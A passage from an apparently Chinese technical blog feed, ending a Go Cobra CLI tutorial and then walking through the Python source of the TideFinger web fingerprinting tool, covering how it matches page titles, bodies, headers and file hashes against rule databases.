src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308200948231.png" alt="image-20230820094820139"></p><p>初始化成功后，会自动生成一个 main.go 和 cmd 包，cmd 包下面就是命令行管理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">├── LICENSE<br>├── cmd<br>│   └── root.go<br>├── go.mod<br>├── go.sum<br>└── main.go<br></code></pre></td></tr></table></figure><p>root.go 是主命令函数，其下分这几个部分：</p><ul><li><p><code>rootCmd</code>.Command 实例</p><ul><li>Use：命令名称</li></ul><ul><li><p>Short：简短描述</p></li><li><p>Long：详细描述 &#x3D;&gt; 会显示</p></li><li><p>Run()：该命令的执行函数</p></li></ul></li><li><p><code>Execute()</code>：执行 rootCmd.Execute()</p></li><li><p><code>init()</code>：初始化 initConfig() 、设置命令参数</p></li><li><p><code>initConfig()</code>：viper 读取配置文件</p></li></ul><h2 id="添加子命令"><a href="#添加子命令" class="headerlink" title="添加子命令"></a>添加子命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加 subdomain 子命令</span><br>cobra-cli add subdomain<br><span class="hljs-meta prompt_"># </span><span class="language-bash">在 subdomain 添加 config 子命令</span><br>cobra-cli add config -p subdomainCmd<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308201005199.png" alt="image-20230820100505106"></p><p>添加子命令后就会在 cmd 下生成对应的文件，例如 subdomain.go 和 config.go。</p><p>这些子命令的内容和 root.go 差不多，不过只有 subdomainCmd 和 init()。</p><h2 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h2><p>参数这里分为永久和本地：</p><ul><li>永久：定义它的命令和其子命令都可以使用</li><li>本地：只能在定义它的命令中使用</li></ul><p>在 init() 中添加参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 永久参数</span><br>rootCmd.PersistentFlags().StringVarP(&amp;target, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;单个URL&quot;</span>)<br><span class="hljs-comment">// 本地参数</span><br>rootCmd.Flags().StringVarP(&amp;targets, <span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;目标文件&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里的 target、targets 是需要提前定义好的。不定义的话可以使用 StringP() 这种，没有 Var 的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">rootCmd.Flags().StringP(<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;目标文件&quot;</span>)<br></code></pre></td></tr></table></figure><p>之后可以通过 Get 获取到参数值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">Run: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cmd cobra.Command, args []<span class="hljs-type">string</span>)</span></span> &#123;<br>    file, err := cmd.Flags().GetString(<span class="hljs-string">&quot;file&quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125;<br>    fmt.Println(file)<br>&#125;,<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>第三方库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TideFinger源码学习</title>
    <link href="/2023/08/19/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/TideFinger%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/19/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/TideFinger%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="TideFinger源码学习"><a href="#TideFinger源码学习" class="headerlink" title="TideFinger源码学习"></a>TideFinger源码学习</h1><p>准备写一个指纹识别工具，先看一下比较好的工具是如何实现的。这里读的是 Python3 版本的，作者也写了 Go 版的，挺好用，但是没开源，先看一看 Python3 的。</p><p>项目地址：<a href="https://github.com/TideSec/TideFinger/">https://github.com/TideSec/TideFinger/</a></p><h2 id="工具思路"><a href="#工具思路" class="headerlink" title="工具思路"></a>工具思路</h2><p>这里简单的画个图，该工具的指纹识别是这几种方法：</p><ol><li>根据 title、body、header 信息进行指纹识别</li><li>调用 wappalyzer 工具进行指纹识别</li><li>根据 Powered by &#x3D;&gt; 未使用，但写了</li><li>根据特征文件的 md5、keyword 等进行指纹匹配</li></ol><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191606368.png" alt="TideFinger"></p><p>执行流程：</p><ol><li>先请求 URL，获取信息，根据信息在 tide 中进行匹配</li><li>调用  wappalyzer  对 URL 进行指纹识别，获取结果</li><li>合并去除上面的指纹结果，判断是否识别出了 CMS<ol><li>识别出 CMS 直接输出结果，程序结束</li><li>未识别出 CMS ，则拼接 cms 表中所有的 path 进行匹配<ol><li>匹配成功，该 CMS 的 hit + 1</li><li>匹配失败，No Found</li></ol></li></ol></li></ol><h2 id="tide-指纹匹配"><a href="#tide-指纹匹配" class="headerlink" title="tide 指纹匹配"></a>tide 指纹匹配</h2><p>从 main 方法开始看，开头的参数和代理就不说了，首先判断目标是否为合法 URL：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^https?:/&#123;2&#125;\w.+$&#x27;</span>, target_url):<br>    <span class="hljs-comment"># 指纹识别</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;URL地址错误&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后调用 Cmsscanner 的 run() 对 cms_finger.db 中的 tide 表指纹进行匹配：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cms = Cmsscanner(target_url)<br><span class="hljs-comment"># 匹配 tide 规则库</span><br>fofa_finger = cms.run()<br></code></pre></td></tr></table></figure><p>run() 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">try</span>:<br>        header, body, title = self.get_info()<br>        <span class="hljs-keyword">for</span> _<span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">int</span>(count()),<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">try</span>:<br>                self.handle(_<span class="hljs-built_in">id</span>, header, body, title)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">return</span> self.finger<br></code></pre></td></tr></table></figure><p>get_info() 方法请求 url 并获取其响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_info</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;获取web的信息&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = requests.get(url=self.target, headers=agent,<br>                         timeout=request_timeout, verify=<span class="hljs-literal">False</span>)<br>        content = r.text<br>        <span class="hljs-keyword">try</span>:<br>            title = BS(content, <span class="hljs-string">&#x27;lxml&#x27;</span>).title.text.strip()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(r.headers), content, title.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(r.headers), content, <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>这里就返回了 tide 需要的 header、body、title。</p><p>获取到信息后就根据此信息遍历 tide 表中的所有指纹，这里是通过 count() 函数得知：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">count</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;获取数据库中 tide 表的指纹数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> sqlite3.connect(pwd + <span class="hljs-string">&#x27;/cms_finger.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cursor = conn.cursor()<br>        <span class="hljs-comment"># 获取 tide 表中指纹数量</span><br>        result = cursor.execute(<span class="hljs-string">&#x27;SELECT COUNT(id) FROM `tide`&#x27;</span>)<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-keyword">return</span> row[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>之后就是对每一条规则进行匹配了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># 给一个规则id和web 信息进行匹配</span><br>self.handle(_<span class="hljs-built_in">id</span>, header, body, title)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>这里 tide 表的规则看了一下是 1000 条，如果这里搞个线程应该更快。</p><p>看一下  handle() 具体是如何匹配指纹规则的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self, _<span class="hljs-built_in">id</span>, header, body, title</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;取出数据库的 key 进行匹配&quot;&quot;&quot;</span><br>    name, key = check(_<span class="hljs-built_in">id</span>)<br>    <span class="hljs-comment"># 满足一个条件即可的情况, 分割获取一个规则</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;||&#x27;</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>        <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> key.split(<span class="hljs-string">&#x27;||&#x27;</span>):<br>            <span class="hljs-keyword">if</span> self.check_rule(rule, header, body, title):<br>                self.finger.append(name)<br>                <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 只有一个条件的情况</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;||&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>        <span class="hljs-keyword">if</span> self.check_rule(key, header, body, title):<br>            self.finger.append(name)<br>            <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br>    <span class="hljs-comment"># 需要同时满足条件的情况, 记录每一个规则的匹配结果, 全部匹配则通过</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;||&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>        num = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> key.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>):<br>            <span class="hljs-keyword">if</span> self.check_rule(rule, header, body, title):<br>                num += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> num == <span class="hljs-built_in">len</span>(key.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>)):<br>            self.finger.append(name)<br>            <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 与条件下存在并条件: 1||2||(3&amp;&amp;4)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> <span class="hljs-keyword">in</span> re.findall(rbracket, key)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> key.split(<span class="hljs-string">&#x27;||&#x27;</span>):<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> <span class="hljs-keyword">in</span> rule:<br>                    num = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">for</span> _rule <span class="hljs-keyword">in</span> rule.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>):<br>                        <span class="hljs-keyword">if</span> self.check_rule(_rule, header, body, title):<br>                            num += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> num == <span class="hljs-built_in">len</span>(rule.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>)):<br>                        self.finger.append(name)<br>                        <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">if</span> self.check_rule(rule, header, body, title):<br>                        self.finger.append(name)<br>                        <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br>                        <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 并条件下存在与条件： 1&amp;&amp;2&amp;&amp;(3||4)</span><br>            <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> key.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>):<br>                num = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;||&#x27;</span> <span class="hljs-keyword">in</span> rule:<br>                    <span class="hljs-keyword">for</span> _rule <span class="hljs-keyword">in</span> rule.split(<span class="hljs-string">&#x27;||&#x27;</span>):<br>                        <span class="hljs-keyword">if</span> self.check_rule(_rule, title, body, header):<br>                            num += <span class="hljs-number">1</span><br>                            <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">if</span> self.check_rule(rule, title, body, header):<br>                        num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> num == <span class="hljs-built_in">len</span>(key.split(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>)):<br>                self.finger.append(name)<br>                <span class="hljs-comment"># print &#x27;%s[+] %s   %s%s&#x27; % (G, self.target, name, W)</span><br></code></pre></td></tr></table></figure><p>check() 函数是根据规则 id 获取 name 和 keys，就是下面的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">_<span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;从 tide 表中获取要匹配的 id 的 name,keys&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> sqlite3.connect(pwd + <span class="hljs-string">&#x27;/cms_finger.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cursor = conn.cursor()<br>        result = cursor.execute(<span class="hljs-string">&#x27;SELECT name, keys FROM `tide` WHERE id=\&#x27;&#123;&#125;\&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(_<span class="hljs-built_in">id</span>))<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-keyword">return</span> row[<span class="hljs-number">0</span>], row[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191640165.png" alt="image-20230819164016053"></p><p>获取到了规则后就开始进行匹配，keys 有这几种情况：</p><ol><li>只有一种情况 &#x3D;&gt; 直接匹配</li><li>或关系 &#x3D;&gt; 遍历每一个规则，匹配一个即可</li><li>与关系 &#x3D;&gt; 遍历每一个规则，都要匹配成功</li><li>与中有并 &#x3D;&gt; 没有并的情况下，匹配一个即可。到了有并的子条件下，再分解并，都得匹配成功</li><li>并中有与 &#x3D;&gt; 没有与的情况下，都匹配成功后，解析是与的子条件，匹配一个即可</li></ol><p>分好情况后，将 keys 解析为一个个单独的 key ，再调用 check_rule() 进行匹配：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_rule</span>(<span class="hljs-params">self, key, header, body, title</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;title=&quot;&#x27;</span> <span class="hljs-keyword">in</span> key:<br>            <span class="hljs-keyword">if</span> re.findall(rtitle, key)[<span class="hljs-number">0</span>].lower() <span class="hljs-keyword">in</span> title.lower():<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;body=&quot;&#x27;</span> <span class="hljs-keyword">in</span> key:<br>            <span class="hljs-keyword">if</span> re.findall(rbody, key)[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> body: <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> re.findall(rheader, key)[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> header: <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>然后根据 keys 的情况，组合子 key 的结果获得最终结果，得出 tide 表的指纹匹配结果。</p><h2 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h2><p>这里就是调用 Wappalyzer 工具对目标进行指纹识别了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    Wappalyzer = useWappalyzer(target_url)<br>    <span class="hljs-comment"># print(&quot;Wappalyzer:&quot;,Wappalyzer)</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> Wappalyzer:<br>        x = <span class="hljs-built_in">str</span>(x).replace(<span class="hljs-string">&#x27;\\;confidence:50&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment"># print(x)</span><br>        banner.append(x)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wappalyzer check error:&quot;</span>,e)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">try</span>:<br>    update = <span class="hljs-literal">False</span><br>    webanalyzer_banner = webanalyzer.check(target_url,update)<br>    <span class="hljs-keyword">for</span> webanalyzer_banner_ <span class="hljs-keyword">in</span> webanalyzer_banner:<br>        banner.append(webanalyzer_banner_)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Webanalyzer check error:&quot;</span>,e)<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>之后就是合并去重，转换为小写，做了一个判断，如果有指纹在 cms_finger_list 中，就将指纹给 cms_name ，cms_name_flag 设为 1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> banner_tmp2 <span class="hljs-keyword">in</span> banner:<br>banner_all= banner_all + <span class="hljs-string">&#x27; | &#x27;</span>+banner_tmp2<br><span class="hljs-keyword">if</span> banner_tmp2.lower() <span class="hljs-keyword">in</span> cms_finger_list:<br>cms_name = banner_tmp2<br>cms_name_flag = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>当 cms_name_flag 不为 1 时，就通过 cms 表中的文件及其 md5、keyword 进行判断，也就是 finger_query() 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cms_name_flag:<br>    <span class="hljs-keyword">if</span> dir_mode == <span class="hljs-number">1</span>:<br>        cms_name_tmp = finger_query(target_url)<br>        <span class="hljs-keyword">if</span> cms_name_tmp:<br>            cms_name = cms_name_tmp[<span class="hljs-string">&#x27;cms_name&#x27;</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">finger_query</span>(<span class="hljs-params">url</span>):<br>    whatcms=WhatCms(url,<span class="hljs-string">&#x27;cms_finger.db&#x27;</span>)<br>    whatcms.run()<br>    finger_dic = whatcms.get_result()<br>    <span class="hljs-keyword">return</span> finger_dic<br></code></pre></td></tr></table></figure><p>具体的执行时 whatCms 的 run() 方法，这里可以看到是有一个 find_powered_by() 不过没有使用。然后就是从 cms 表中获取数据，数据要先通过 hit 排序，这个 hit 就是命中率，命中的越多，这个指纹也就优先被识别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># info=self.find_powered_by()</span><br>    info = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info:<br>        sqlconn1=sqlite3.connect(self.file_path)<br>        sqlcursor1=sqlconn1.cursor()<br>        sqlcursor1.execute(<span class="hljs-string">&#x27;select  from cms order by hit&#x27;</span>)<br>        self.cms = sqlcursor1.fetchall()<br>        <span class="hljs-comment"># print self.cms[1]</span><br>        sqlcursor1.close()<br>        sqlconn1.close()<br>        self.start_threads()<br></code></pre></td></tr></table></figure><p>具体的执行在 start_threads() 方法：</p><p>这里是利用了线程池进行请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_threads</span>(<span class="hljs-params">self</span>):<br><br>    wm_domain_task = WorkManager(self.thread_num,<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.thread_num):<br>        wm_domain_task.add_job(self.find_cms_with_file)<br>    wm_domain_task.start()<br>    wm_domain_task.wait_for_complete()<br></code></pre></td></tr></table></figure><p>find_cms_with_file() 方法就是根据文件进行 cms 识别的具体实现了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 